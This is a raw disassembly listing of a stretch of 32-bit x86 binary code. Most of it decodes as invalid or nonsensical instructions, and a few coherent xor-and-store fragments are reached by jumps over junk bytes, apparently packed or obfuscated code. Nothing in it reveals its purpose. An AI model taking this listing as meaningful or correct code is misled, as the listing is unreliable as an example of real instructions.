  4082b1:	fsub   QWORD PTR [esi-0x5e4140d4]
  4082b7:	ret    0xc4bc
  4082ba:	jle    0x408279
  4082bc:	and    BYTE PTR [edi],0x3
  4082bf:	nop
  4082c0:	(bad)  
  4082c2:	mov    ds:0x173cd49e,al
  4082c7:	xchg   esi,eax
  4082c8:	leave  
  4082c9:	mov    ah,bh
  4082cb:	aas    
  4082cc:	dec    edx
  4082cd:	push   0xffffffc8
  4082cf:	jl     0x408319
  4082d1:	or     esi,DWORD PTR [ebx-0x19d5a983]
  4082d7:	push   eax
  4082d8:	cli    
  4082d9:	inc    edx
  4082da:	rol    bl,0x1a
  4082dd:	and    eax,0x38353543
  4082e2:	scas   al,BYTE PTR es:[edi]
  4082e3:	adc    edi,DWORD PTR [edx+0x66e29d5]
  4082e9:	shl    BYTE PTR [edi-0x44],1
  4082ec:	popf   
  4082ed:	or     bl,BYTE PTR [ecx+eiz*2]
  4082f0:	pop    edi
  4082f1:	ror    DWORD PTR ds:0xccc6ecd7,cl
  4082f7:	mov    edx,0xb86d306f
  4082fc:	or     eax,0xa4b00550
  408301:	sub    dl,BYTE PTR [eax+0x77]
  408304:	not    DWORD PTR [edi+0x6b745045]
  40830a:	mov    dl,0xf5
  40830c:	xor    ch,BYTE PTR [edx+0x7]
  40830f:	jae    0x4082bf
  408311:	pop    ecx
  408312:	and    al,0xc2
  408314:	lods   eax,DWORD PTR ds:[esi]
  408315:	add    BYTE PTR [ecx],al
  408317:	clc    
  408318:	call   0x45348a67
  40831d:	push   esi
  40831e:	and    al,0x1a
  408320:	icebp  
  408321:	inc    edi
  408322:	pop    es
  408323:	mov    dl,0x7c
  408325:	inc    ebp
  408326:	or     DWORD PTR [esi+ebx*1-0x2871cc66],ebp
  40832d:	addr16 xchg edi,eax
  40832f:	pop    eax
  408330:	cld    
  408331:	loop   0x4082b4
  408333:	shl    BYTE PTR [ebx],cl
  408335:	jb     0x408336
  408337:	dec    DWORD PTR [ecx-0x2c16f3ab]
  40833d:	add    BYTE PTR [eax],al
  40833f:	add    BYTE PTR [edi-0x289f28e9],al
  408345:	loopne 0x4082fe
  408347:	test   esp,0x160d6eef
  40834d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40834f:	addr16 clc 
  408351:	dec    ebx
  408352:	add    BYTE PTR [eax],al
  408354:	mov    ebx,0xac000000
  408359:	idiv   eax
  40835b:	(bad)  
  40835c:	mov    esi,0x758be68e
  408361:	adc    BYTE PTR [eax-0x2d80e415],bl
  408367:	and    BYTE PTR [ebx],dh
  408369:	cmp    dh,bh
  40836b:	outs   dx,DWORD PTR ds:[esi]
  40836c:	daa    
  40836d:	sar    BYTE PTR [edi],cl
  40836f:	dec    ebp
  408370:	xchg   ebx,eax
  408371:	call   0xe49b4896
  408376:	xor    ah,al
  408378:	shl    bl,cl
  40837a:	xlat   BYTE PTR ds:[ebx]
  40837b:	popa   
  40837c:	cmp    ch,BYTE PTR [edx+ebp*2+0x36]
  408380:	xor    dh,cl
  408382:	js     0x40835b
  408384:	sti    
  408385:	pop    ebp
  408386:	xchg   ebp,eax
  408387:	pushf  
  408388:	mov    esi,DWORD PTR [esi+0x10f08374]
  40838e:	and    DWORD PTR [ebx+0x14],ebp
  408391:	or     eax,0xfced5840
  408396:	and    esp,DWORD PTR [edi-0x57]
  408399:	das    
  40839a:	lds    edx,FWORD PTR [esi-0x1d994441]
  4083a0:	jb     0x4083b3
  4083a2:	and    al,0x9b
  4083a4:	out    dx,al
  4083a5:	cli    
  4083a6:	hlt    
  4083a7:	or     bl,al
  4083a9:	bound  edi,QWORD PTR [ecx-0x2834f3a5]
  4083af:	retf   
  4083b0:	dec    edi
  4083b1:	xlat   BYTE PTR ds:[ebx]
  4083b2:	fwait
  4083b3:	in     eax,0x0
  4083b5:	push   ds
  4083b6:	test   BYTE PTR [ebx],dh
  4083b8:	retf   
  4083b9:	mov    ch,0xe8
  4083bb:	xchg   esp,eax
  4083bc:	jo     0x408421
  4083be:	xchg   edx,eax
  4083bf:	jbe    0x40837b
  4083c1:	mov    bl,0xb2
  4083c3:	mov    dh,0x25
  4083c5:	call   0xf297:0x7c71534a
  4083cc:	add    esi,DWORD PTR [edx]
  4083ce:	addr16 addr16 inc ecx
  4083d1:	(bad)  
  4083d2:	aad    0x67
  4083d4:	adc    BYTE PTR [edx+0x5f5a6afa],ch
  4083da:	push   esi
  4083db:	clc    
  4083dc:	inc    esi
  4083dd:	dec    edi
  4083de:	hlt    
  4083df:	sub    al,0x93
  4083e1:	jns    0x4083a4
  4083e3:	rcl    DWORD PTR [ebx-0x33a4263f],1
  4083e9:	pop    ss
  4083ea:	sub    ebx,DWORD PTR [edx]
  4083ec:	inc    edx
  4083ed:	scas   eax,DWORD PTR es:[edi]
  4083ee:	jmp    0x19b8:0xf474af17
  4083f5:	js     0x408465
  4083f7:	mov    al,ds:0xb2545587
  4083fc:	pop    edx
  4083fd:	jae    0x4083a1
  4083ff:	jns    0x40843e
  408401:	dec    edx
  408402:	lock sub DWORD PTR [edi+0x725b2b7b],ebx
  408409:	xor    bl,al
  40840b:	sub    DWORD PTR [ebx],ebx
  40840d:	sub    bh,BYTE PTR [ebp-0x67]
  408410:	mov    ebx,0x578b7ca0
  408415:	add    al,0x33
  408417:	push   ebp
  408418:	or     al,0xe9
  40841a:	rol    DWORD PTR [eax],cl
  40841c:	add    BYTE PTR [eax],al
  40841e:	into   
  40841f:	jmp    0xbfb0236f
  408424:	fdivp  st(1),st
  408426:	sbb    eax,0x5abbca86
  40842b:	lods   al,BYTE PTR ds:[esi]
  40842c:	aaa    
  40842d:	ins    DWORD PTR es:[edi],dx
  40842e:	mov    bl,0x4c
  408430:	add    BYTE PTR [eax],al
  408432:	mov    ebx,0x3a000000
  408437:	and    ch,ah
  408439:	cmp    eax,DWORD PTR [ecx+ebx*8]
  40843c:	adc    eax,0xde48d333
  408441:	je     0x408402
  408443:	call   0x321acc6
  408448:	dec    ecx
  408449:	add    eax,0x5ce951f4
  40844e:	mov    ah,0x46
  408450:	gs jo  0x4083f8
  408453:	cli    
  408454:	pop    ebp
  408455:	xlat   BYTE PTR ds:[ebx]
  408456:	clc    
  408457:	xchg   ebx,eax
  408458:	aas    
  408459:	mov    al,BYTE PTR [ecx+0x5faa40c3]
  40845f:	mov    al,0x96
  408461:	outs   dx,BYTE PTR ds:[esi]
  408462:	push   edi
  408463:	sbb    bl,BYTE PTR [eax+esi*2]
  408466:	dec    edi
  408467:	mov    edi,0x9425ea2a
  40846c:	loope  0x408450
  40846e:	pop    ss
  40846f:	mov    al,ds:0xe3f85440
  408474:	sub    al,0xf1
  408476:	popa   
  408477:	inc    esi
  408478:	call   0x9302bb74
  40847d:	pusha  
  40847e:	pop    esp
  40847f:	clc    
  408480:	cmp    eax,0x226bd2c
  408485:	(bad)  
  408486:	pop    esp
  408487:	je     0x40840f
  408489:	ins    BYTE PTR es:[edi],dx
  40848a:	add    BYTE PTR [ecx+ebp*1+0x6a35ac1c],0xe9
  408492:	inc    DWORD PTR [ebp-0x42]
  408495:	push   cs
  408496:	ins    DWORD PTR es:[edi],dx
  408497:	pop    eax
  408498:	push   ss
  408499:	test   ch,dl
  40849b:	and    al,ch
  40849d:	sbb    al,ch
  40849f:	and    eax,0x4d692c03
  4084a4:	out    0xcc,eax
  4084a6:	xor    DWORD PTR [eax-0x32888218],ecx
  4084ac:	jae    0x40846b
  4084ae:	arpl   WORD PTR [ecx-0x6f],bx
  4084b1:	lahf   
  4084b2:	xchg   edx,eax
  4084b3:	add    al,0xc
  4084b5:	dec    edi
  4084b6:	and    ecx,DWORD PTR [edi-0x39]
  4084b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084ba:	fsub   DWORD PTR [eax]
  4084bc:	pushf  
  4084bd:	fstp   st(4)
  4084bf:	mov    DWORD PTR [ecx+0x5226fe15],edx
  4084c5:	sti    
  4084c6:	shr    BYTE PTR [ebp-0x2],cl
  4084c9:	mov    bh,0x51
  4084cb:	xor    al,0xc1
  4084cd:	adc    al,0xdb
  4084cf:	cwde   
  4084d0:	jg     0x408526
  4084d2:	ror    BYTE PTR [esi],cl
  4084d4:	(bad)  
  4084d5:	(bad)  
  4084d6:	dec    ecx
  4084d7:	mov    esp,0x4ca083c4
  4084dc:	sar    esi,cl
  4084de:	jnp    0x408513
  4084e0:	sbb    ah,BYTE PTR [ecx-0x53886656]
  4084e6:	fisubr WORD PTR [ebx+0x5e]
  4084e9:	test   al,0xd2
  4084eb:	xchg   ebx,eax
  4084ec:	adc    al,0x62
  4084ee:	jmp    FWORD PTR [eax+0x38]
  4084f1:	xor    ecx,eax
  4084f3:	xor    ecx,esi
  4084f5:	mov    DWORD PTR [edi],ecx
  4084f7:	jmp    0x40a27b
  4084fc:	mov    eax,DWORD PTR [ebp-0xc]
  4084ff:	add    eax,DWORD PTR [ebp-0x4]
  408502:	jmp    0x4085da
  408507:	mov    bh,0x5c
  408509:	xchg   esi,eax
  40850a:	(bad)  
  40850c:	(bad)  
  40850e:	jle    0x4084a9
  408510:	fwait
  408511:	jge    0x4084b2
  408513:	int    0x63
  408515:	or     DWORD PTR [edi+0x4d6e],ebx
  40851b:	mov    ebx,0x74000000
  408520:	dec    edi
  408521:	and    BYTE PTR [ebx-0x79a429d0],dh
  408527:	je     0x408586
  408529:	lods   al,BYTE PTR ds:[esi]
  40852a:	test   al,0x26
  40852c:	scas   al,BYTE PTR es:[edi]
  40852d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40852e:	sahf   
  40852f:	sahf   
  408530:	or     dl,BYTE PTR [ebp-0x2323e71f]
  408536:	(bad)  
  408537:	loop   0x4084e9
  408539:	je     0x40859a
  40853b:	pop    eax
  40853c:	test   al,0x74
  40853e:	jno    0x40855b
  408540:	jo     0x4084d6
  408542:	sub    eax,0x3b8d948c
  408547:	out    dx,al
  408548:	data16 cmp cl,BYTE PTR gs:[esi+0x18768495]
  408550:	jle    0x4085b1
  408552:	test   DWORD PTR [ebp-0x7ac0bf4c],esi
  408558:	outs   dx,BYTE PTR ds:[esi]
  408559:	fisubr DWORD PTR [edi-0x2f]
  40855c:	retf   
  40855d:	inc    esp
  40855e:	dec    eax
  40855f:	pop    ebx
  408560:	in     eax,dx
  408561:	mov    al,ds:0xca888f0d
  408566:	lods   al,BYTE PTR ds:[esi]
  408567:	pop    eax
  408568:	pop    edi
  408569:	ins    BYTE PTR es:[edi],dx
  40856a:	push   ebp
  40856b:	jnp    0x4085ea
  40856d:	imul   ebx,DWORD PTR [edx+0x6f],0x3946fc83
  408574:	xchg   ecx,eax
  408575:	xor    ebp,DWORD PTR [edx+eax*4-0x18bef046]
  40857c:	add    BYTE PTR [edi],bh
  40857e:	xor    eax,0x4dc8b4f3
  408583:	in     eax,0xd8
  408585:	imul   esp,DWORD PTR [ecx+0x46],0xffffffc7
  408589:	mov    ?,WORD PTR [eax+ebp*2]
  40858c:	cdq    
  40858d:	sbb    ch,dh
  40858f:	(bad)  
  408590:	push   eax
  408591:	jae    0x40851f
  408593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408594:	pusha  
  408595:	stos   BYTE PTR es:[edi],al
  408596:	sbb    ah,BYTE PTR [eax]
  408598:	cli    
  408599:	jge    0x408594
  40859b:	adc    edx,DWORD PTR [edi-0x61]
  40859e:	sub    ch,0x81
  4085a1:	xchg   edi,eax
  4085a2:	pop    es
  4085a3:	cs pop es
  4085a5:	sahf   
  4085a6:	mov    edx,0x7ab5e744
  4085ab:	mov    bl,0x2a
  4085ad:	inc    eax
  4085ae:	sar    DWORD PTR [ecx-0x3d],1
  4085b1:	and    al,0x8f
  4085b3:	mov    esi,0xbe8b9cdb
  4085b8:	int3   
  4085b9:	ja     0x4085fb
  4085bb:	jo     0x408560
  4085bd:	mov    WORD PTR [ebp+0x56bfe2e3],cs
  4085c3:	pop    ss
  4085c4:	xchg   ebp,eax
  4085c5:	pop    esp
  4085c6:	lahf   
  4085c7:	mov    dh,0xa8
  4085c9:	lea    ebx,[edi+0x2daea288]
  4085cf:	add    cl,BYTE PTR [esi]
  4085d1:	fs hlt 
  4085d3:	xchg   esp,eax
  4085d4:	jmp    0x4085fc
  4085d6:	aas    
  4085d7:	jb     0x408572
  4085d9:	ja     0x408564
  4085db:	inc    ebp
  4085dc:	lock mov eax,DWORD PTR [ebp-0x10]
  4085e0:	jmp    0x4086b8
  4085e5:	js     0x408635
  4085e7:	or     al,0x56
  4085e9:	ds push esi
  4085eb:	jp     0x40865b
  4085ed:	push   ss
  4085ee:	dec    edi
  4085ef:	or     al,0x69
  4085f1:	repz or ecx,DWORD PTR [edx+0x6d]
  4085f5:	sub    DWORD PTR [esi+0x0],ecx
  4085f8:	add    BYTE PTR [ebx-0x5000000],bh
  4085fe:	mov    WORD PTR ds:0x9f772b35,fs
  408604:	sub    BYTE PTR [ebx-0x6a],al
  408607:	shl    DWORD PTR [eax],0x14
  40860a:	lds    edi,FWORD PTR [eax]
  40860c:	fwait
  40860d:	clc    
  40860e:	xchg   edi,eax
  40860f:	mov    dh,0xce
  408611:	inc    esp
  408612:	mov    cl,0x43
  408614:	scas   eax,DWORD PTR es:[edi]
  408615:	fmul   st(0),st
  408617:	aad    0x67
  408619:	clc    
  40861a:	out    0x8d,al
  40861c:	sub    eax,0x5c0c9f4f
  408621:	cmp    BYTE PTR [ecx-0x31],ah
  408624:	call   0x3d33865
  408629:	and    edi,edx
  40862b:	jmp    0xa9bd0fc0
  408630:	(bad)
  408634:	sbb    cl,dl
  408636:	mov    ch,dh
  408638:	mul    BYTE PTR [ebx]
  40863a:	pop    edx
  40863b:	dec    BYTE PTR [esi]
  40863d:	pop    ecx
  40863e:	sub    edi,DWORD PTR [edi]
  408640:	xchg   esi,eax
  408641:	out    0x13,al
  408643:	and    al,0x3a
  408645:	imul   eax,DWORD PTR [eax+0x15],0x49
  408649:	and    al,0x63
  40864b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40864c:	xlat   BYTE PTR ds:[ebx]
  40864d:	xor    ecx,DWORD PTR [edx-0x38811f3]
  408653:	jmp    0x93a7a1a1
  408658:	cmp    ebp,ebx
  40865a:	xor    ebx,DWORD PTR [edi]
  40865c:	inc    ebp
  40865d:	imul   esp,DWORD PTR [ecx-0x145614d2],0x47e45561
  408667:	push   ecx
  408668:	ins    BYTE PTR es:[edi],dx
  408669:	arpl   WORD PTR [ebx+0x28],ax
  40866c:	shr    BYTE PTR [eax-0x7e89c733],cl
  408672:	dec    esi
  408673:	ret    0x28eb
  408676:	enter  0xbf5b,0xbe
  40867a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40867b:	fwait
  40867c:	cmp    DWORD PTR ds:0x7484ceae,ebp
  408682:	pop    esi
  408683:	pushf  
  408684:	sub    DWORD PTR [ebp+0x47849c04],ebp
  40868a:	add    al,0x49
  40868c:	sbb    esp,DWORD PTR [edx]
  40868e:	xchg   DWORD PTR [eax+0x143110dc],edi
  408694:	fdiv   QWORD PTR [ebp+0x538d054f]
  40869a:	inc    esp
  40869b:	dec    ebx
  40869c:	(bad)  
  40869d:	cmp    DWORD PTR [ecx],ecx
  40869f:	adc    bh,BYTE PTR [ebp+ebx*4+0x48]
  4086a3:	fisubr WORD PTR [ebx]
  4086a5:	adc    al,0xd3
  4086a7:	pusha  
  4086a8:	sbb    al,0x36
  4086aa:	jl     0x40869f
  4086ac:	fwait
  4086ad:	jnp    0x4086a2
  4086af:	rcr    BYTE PTR [ebp+0x13],0x5b
  4086b3:	mov    dl,0xf6
  4086b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086b6:	les    esi,FWORD PTR [ecx-0x74f3bf75]
  4086bc:	push   ebp
  4086bd:	cld    
  4086be:	jmp    0x408796
  4086c3:	or     al,0x6b
  4086c5:	or     edx,esi
  4086c7:	outs   dx,DWORD PTR ds:[esi]
  4086c8:	repnz (bad) 
  4086ca:	(bad)  
  4086cb:	std    
  4086cc:	and    DWORD PTR [ebp-0x6508f83c],esp
  4086d2:	mov    ebx,0x4ee4
  4086d7:	mov    ebx,0x71000000
  4086dc:	test   DWORD PTR [edx-0x1b4d28a9],eax
  4086e2:	test   eax,0x812e7df5
  4086e7:	aaa    
  4086e8:	and    al,0x39
  4086ea:	in     al,dx
  4086eb:	jne    0x408717
  4086ed:	ret    0x50b5
  4086f0:	push   ss
  4086f1:	inc    esi
  4086f2:	add    esp,DWORD PTR [ebp+esi*4-0x31]
  4086f6:	mov    ds:0x6bff0cb7,al
  4086fb:	(bad)  
  4086fc:	mov    al,0x6f
  4086fe:	pop    ds
  4086ff:	cmc    
  408700:	push   es
  408701:	popf   
  408702:	inc    esp
  408703:	inc    edi
  408704:	push   ss
  408705:	adc    al,0x60
  408707:	xor    eax,0xa6dcc999
  40870c:	lock or al,BYTE PTR [esi-0x1591c72c]
  408713:	jne    0x4086e0
  408715:	hlt    
  408716:	into   
  408717:	xchg   DWORD PTR [ebp+0x41331cf6],edx
  40871d:	add    eax,DWORD PTR [edx+0x57a9a125]
  408723:	sahf   
  408724:	mov    edx,0x117817b8
  408729:	mov    dh,0x28
  40872b:	in     eax,dx
  40872c:	pusha  
  40872d:	add    BYTE PTR ss:[eax],al
  408730:	and    edx,ebp
  408732:	add    BYTE PTR [esi+0x42896b0c],cl
  408738:	xor    DWORD PTR [edi],0xffffffb5
  40873b:	je     0x4087a9
  40873d:	enter  0xd8e4,0xd3
  408741:	pop    edx
  408742:	adc    ah,bl
  408744:	pop    ebx
  408745:	mov    dh,0x14
  408747:	int3   
  408748:	jg     0x4087a3
  40874a:	(bad)  
  40874b:	or     bh,BYTE PTR [edx+eax*1-0x30760f5f]
  408752:	loopne 0x4087c9
  408754:	mov    edi,0x6f0301f8
  408759:	dec    esp
  40875a:	dec    edx
  40875b:	(bad)  
  40875c:	test   al,0xfd
  40875e:	imul   esp,DWORD PTR [esp+ebp*1],0x10
  408762:	cmp    ch,BYTE PTR [ecx+eiz*4]
  408765:	pushf  
  408766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408768:	lds    esi,FWORD PTR [edi]
  40876a:	or     cl,BYTE PTR [ecx-0x694f7d93]
  408770:	test   DWORD PTR [ebp-0x47],ebx
  408773:	sbb    DWORD PTR [ebp-0x5e],edi
  408776:	ja     0x408772
  408778:	mov    DWORD PTR [ecx-0x1cda7fa4],edi
  40877e:	mov    bl,0xb1
  408780:	and    esp,DWORD PTR [eax+0x10]
  408783:	mov    ds:0xa05a1506,eax
  408788:	sbb    DWORD PTR [ebp+0x5f3177e8],ecx
  40878e:	adc    BYTE PTR [ebp-0x1b65dd9a],0xa8
  408795:	movzx  eax,WORD PTR gs:[edx+eax*1]
  40879a:	cdq    
  40879b:	add    eax,0x66479db3
  4087a0:	jmp    0x408878
  4087a5:	fimul  WORD PTR [edi+0x7f]
  4087a8:	xor    bh,bh
  4087aa:	xor    bh,bl
  4087ac:	out    dx,eax
  4087ad:	and    dl,cl
  4087af:	mov    esp,0xfa18641c
  4087b4:	je     0x408755
  4087b6:	dec    edi
  4087b7:	add    BYTE PTR [eax],al
  4087b9:	mov    ebx,0xd1000000
  4087be:	fist   WORD PTR [ebx]
  4087c0:	popa   
  4087c1:	mov    DWORD PTR [ebp-0x2a],ebx
  4087c4:	adc    ebx,DWORD PTR [ecx*1-0x601c7d99]
  4087cb:	shl    BYTE PTR [esp],cl
  4087ce:	or     eax,0x358a06b2
  4087d3:	add    ecx,edi
  4087d5:	mov    esp,0x10fea9a5
  4087da:	sbb    ecx,DWORD PTR [ebx-0x30cdc2fa]
  4087e0:	push   eax
  4087e1:	loop   0x408838
  4087e3:	sbb    BYTE PTR [eax+0x41],al
  4087e6:	mov    edx,0xed5f8a3b
  4087eb:	or     ah,BYTE PTR [ebx]
  4087ed:	fisub  DWORD PTR [ecx+eiz*8]
  4087f0:	add    eax,0x9c3fc95e
  4087f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087f6:	pusha  
  4087f7:	popf   
  4087f8:	and    bl,0x94
  4087fb:	xlat   BYTE PTR ds:[ebx]
  4087fc:	xor    BYTE PTR [edx+0x6aff91f9],dl
  408802:	add    ebx,DWORD PTR [ebx+eax*1]
  408805:	scas   eax,DWORD PTR es:[edi]
  408806:	mov    ch,0x54
  408808:	sub    edi,DWORD PTR [ebp+eiz*2-0x79]
  40880c:	mul    BYTE PTR ds:0xdbd6fcef
  408812:	stc    
  408813:	mov    edi,0xfea70ac6
  408818:	push   0x30
  40881a:	pushf  
  40881b:	pop    ss
  40881c:	jbe    0x40888f
  40881e:	jmp    0x408816
  408820:	jmp    0x23a85db3
  408825:	ins    BYTE PTR es:[edi],dx
  408826:	sub    esp,ecx
  408828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408829:	pop    ebx
  40882a:	ins    DWORD PTR es:[edi],dx
  40882b:	test   ah,dh
  40882d:	jo     0x4087f1
  40882f:	fdiv   QWORD PTR [ebx+0x37c5c9af]
  408835:	daa    
  408836:	or     bl,cl
  408838:	iret   
  408839:	outs   dx,BYTE PTR ds:[esi]
  40883a:	sbb    bh,BYTE PTR [ecx-0x1dd05dfc]
  408840:	iret   
  408841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408842:	ins    BYTE PTR es:[edi],dx
  408843:	push   ecx
  408844:	rcr    BYTE PTR [eax],cl
  408846:	cmc    
  408847:	xchg   ebp,eax
  408848:	adc    eax,0x730ed647
  40884d:	popa   
  40884e:	pop    ebx
  40884f:	sub    dh,BYTE PTR ds:0x6783da27
  408855:	js     0x408816
  408857:	mov    ds:0x37129cd8,al
  40885c:	iret   
  40885d:	repz rcl DWORD PTR [edx],1
  408860:	scas   eax,DWORD PTR es:[edi]
  408861:	jne    0x4088db
  408863:	jecxz  0x4087e6
  408865:	pop    ss
  408866:	xor    eax,0x2c6303fc
  40886b:	test   al,0x5a
  40886d:	ds (bad) 
  40886f:	fisub  WORD PTR [esp+eiz*8-0x27d14eca]
  408876:	pop    ecx
  408877:	das    
  408878:	adc    edx,0xffff7223
  40887e:	xor    edx,ebx
  408880:	mov    DWORD PTR [ebp+0x1c],edx
  408883:	mov    edx,DWORD PTR [ebp-0x48]
  408886:	mov    DWORD PTR [ebp+0x8],edx
  408889:	mov    edx,DWORD PTR [ebp-0x44]
  40888c:	xor    eax,esi
  40888e:	mov    DWORD PTR [ebp+0xc],edx
  408891:	cmp    eax,DWORD PTR [ebp+0x8]
  408894:	jne    0x409fbc
  40889a:	jmp    0x408972
  40889f:	sub    al,BYTE PTR [eax+0x3baa19aa]
  4088a5:	mov    ebx,0x5ec00bb3
  4088aa:	pop    edi
  4088ab:	inc    ebp
  4088ac:	(bad)  
  4088ad:	pop    eax
  4088ae:	or     eax,0x505a
  4088b3:	mov    ebx,0x26000000
  4088b8:	repz adc al,0xd4
  4088bb:	aaa    
  4088bc:	or     esi,ebx
  4088be:	xor    esp,DWORD PTR [ebx+0x18d5f302]
  4088c4:	pushf  
  4088c5:	rcr    bh,cl
  4088c7:	xor    eax,0x2482862d
  4088cc:	push   ebp
  4088cd:	enter  0x38c1,0x2a
  4088d1:	sti    
  4088d2:	loope  0x4088ac
  4088d4:	lahf   
  4088d5:	ja     0x408884
  4088d7:	and    al,bh
  4088d9:	mov    dh,0x3f
  4088db:	icebp  
  4088dc:	xchg   esp,eax
  4088dd:	scas   al,BYTE PTR es:[edi]
  4088de:	int    0xdf
  4088e0:	cmp    al,0xc5
  4088e2:	in     al,dx
  4088e3:	in     eax,dx
  4088e4:	adc    al,0x30
  4088e6:	mov    ss,WORD PTR [eax+eax*4-0x2853f3ba]
  4088ed:	popf   
  4088ee:	rol    DWORD PTR [edi],cl
  4088f0:	(bad)  
  4088f1:	sub    eax,0xf033f1ef
  4088f6:	push   eax
  4088f7:	cmp    ebx,0x6
  4088fa:	adc    eax,0x28fcbc95
  4088ff:	fdiv   DWORD PTR [edx]
  408901:	lahf   
  408902:	mov    dl,0x89
  408904:	shl    DWORD PTR [edi-0xb8c2659],0xdc
  40890b:	add    BYTE PTR [eax+0x146d058d],al
  408911:	adc    esp,esi
  408913:	adc    cl,BYTE PTR [eax-0x67ccc9a3]
  408919:	push   ebx
  40891a:	retf   0xc071
  40891d:	xchg   DWORD PTR [ebx+0x7649b0bc],ebp
  408923:	imul   ebp,DWORD PTR [ebx+0x2128fba2],0xffffff87
  40892a:	mov    ch,0x66
  40892c:	ds cli 
  40892e:	imul   ebp,ecx,0x21
  408931:	rol    DWORD PTR [eax-0x70],cl
  408934:	jg     0x408925
  408936:	leave  
  408937:	inc    ebp
  408938:	ins    DWORD PTR es:[edi],dx
  408939:	xchg   esp,eax
  40893a:	retf   
  40893b:	icebp  
  40893c:	enter  0x8d60,0x80
  408940:	sbb    al,0xc4
  408942:	jle    0x40892c
  408944:	pop    ebp
  408945:	les    ebx,FWORD PTR [ebp-0x1a]
  408948:	enter  0x1d62,0x9a
  40894c:	dec    eax
  40894d:	pusha  
  40894e:	dec    edx
  40894f:	jmp    0xf6fc:0x41b477ae
  408956:	cli    
  408957:	scas   al,BYTE PTR es:[edi]
  408958:	push   0x4c
  40895a:	mov    ebp,0xc0e3258d
  40895f:	and    eax,0xec5f6e1a
  408964:	fcom   QWORD PTR [ebp-0x3]
  408967:	pusha  
  408968:	repnz mov bl,0xb1
  40896b:	jge    0x4088f2
  40896d:	das    
  40896e:	cmp    edx,eax
  408970:	(bad)
  408974:	cmp    DWORD PTR [ebp+0x1c],eax
  408977:	jmp    0x408a4f
  40897c:	popa   
  40897d:	xchg   edi,eax
  40897e:	xor    ebx,DWORD PTR [ebp-0x9]
  408981:	std    
  408982:	outs   dx,DWORD PTR ds:[esi]
  408983:	mov    edi,0x33f139b7
  408988:	loop   0x408926
  40898a:	pop    ecx
  40898b:	ficom  WORD PTR ds:0xbb000051
  408991:	add    BYTE PTR [eax],al
  408993:	add    BYTE PTR [edx],al
  408995:	dec    eax
  408996:	in     eax,dx
  408997:	rol    DWORD PTR [ecx],1
  408999:	push   ds
  40899a:	sub    al,0xa3
  40899c:	test   ecx,ebp
  40899e:	cmp    ebx,DWORD PTR [esi+0x62]
  4089a1:	mov    dh,0x71
  4089a3:	aad    0xf9
  4089a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089a6:	pop    edi
  4089a7:	ficomp WORD PTR [ecx]
  4089a9:	or     BYTE PTR [edi+0x4c],0x5
  4089ad:	jno    0x408932
  4089af:	aas    
  4089b0:	hlt    
  4089b1:	cmp    ebp,esi
  4089b3:	adc    edi,edi
  4089b5:	(bad)  
  4089b6:	daa    
  4089b7:	and    DWORD PTR [edx],0xb6642761
  4089bd:	call   0x6854:0x1485ab26
  4089c4:	sbb    ch,BYTE PTR [ecx]
  4089c6:	out    dx,eax
  4089c7:	pop    ebp
  4089c8:	push   esi
  4089c9:	xchg   edx,eax
  4089ca:	ret    
  4089cb:	inc    esp
  4089cc:	outs   dx,DWORD PTR ds:[esi]
  4089cd:	sbb    ebp,DWORD PTR [esi-0x7e76c68c]
  4089d3:	jle    0x408a42
  4089d5:	call   FWORD PTR ss:[esi+0x58]
  4089d9:	mov    BYTE PTR [edx+0x4836ed1e],bl
  4089df:	lds    edi,FWORD PTR fs:[esi-0xa55ede0]
  4089e6:	push   esp
  4089e7:	jle    0x408981
  4089e9:	push   ebx
  4089ea:	enter  0x21b6,0x1b
  4089ee:	(bad)  
  4089ef:	ins    DWORD PTR es:[edi],dx
  4089f0:	xchg   dx,ax
  4089f2:	(bad)  
  4089f3:	pusha  
  4089f4:	jns    0x408a04
  4089f6:	cmp    DWORD PTR [esi+eiz*2-0xd],esi
  4089fa:	sar    edx,cl
  4089fc:	adc    al,0x91
  4089fe:	into   
  4089ff:	dec    ebx
  408a00:	inc    ecx
  408a01:	pop    es
  408a02:	mov    cl,0x7c
  408a04:	mov    ch,0xca
  408a06:	icebp  
  408a07:	mov    esi,0xae88ebe5
  408a0c:	js     0x408a18
  408a0e:	push   ebp
  408a0f:	icebp  
  408a10:	cmc    
  408a11:	sbb    al,0xfb
  408a13:	neg    BYTE PTR [ecx]
  408a15:	adc    al,0x7f
  408a17:	gs test al,0x70
  408a1a:	mov    ds:0xe6de8a31,eax
  408a1f:	int3   
  408a20:	xor    edx,edi
  408a22:	push   esp
  408a23:	xor    eax,0x244dc014
  408a28:	or     edx,esi
  408a2a:	adc    al,0x49
  408a2c:	and    dl,BYTE PTR [edx+0x33cb5469]
  408a32:	inc    ebp
  408a33:	mov    bl,0x4d
  408a35:	xor    ebx,DWORD PTR [ebp+edi*2-0x38]
  408a39:	and    ah,BYTE PTR [edx+eax*1]
  408a3c:	push   esp
  408a3d:	int3   
  408a3e:	and    ecx,DWORD PTR [ebp+0x6d46ed78]
  408a44:	sub    eax,0xc6b673a6
  408a49:	sbb    DWORD PTR [edi+ebp*2+0xf84ff2a],0xffffff85
  408a51:	addr16 adc eax,0xd3e90000
  408a57:	add    BYTE PTR [eax],al
  408a59:	add    BYTE PTR [esp+ebp*2],ch
  408a5c:	ror    DWORD PTR [edi-0x2f],1
  408a5f:	(bad)  
  408a60:	mov    esi,0xd896cf6f
  408a65:	xor    eax,esp
  408a67:	mul    DWORD PTR [ebp+0x51d065]
  408a6d:	add    BYTE PTR [ebx-0x7c000000],bh
  408a73:	stos   BYTE PTR es:[edi],al
  408a74:	pop    eax
  408a75:	retf   
  408a76:	adc    BYTE PTR [ecx+eiz*2],dl
  408a79:	inc    esi
  408a7a:	sbb    eax,0xe4b6ac6c
  408a7f:	or     eax,0xbb0e02c
  408a84:	icebp  
  408a85:	inc    ecx
  408a86:	mov    al,0xc8
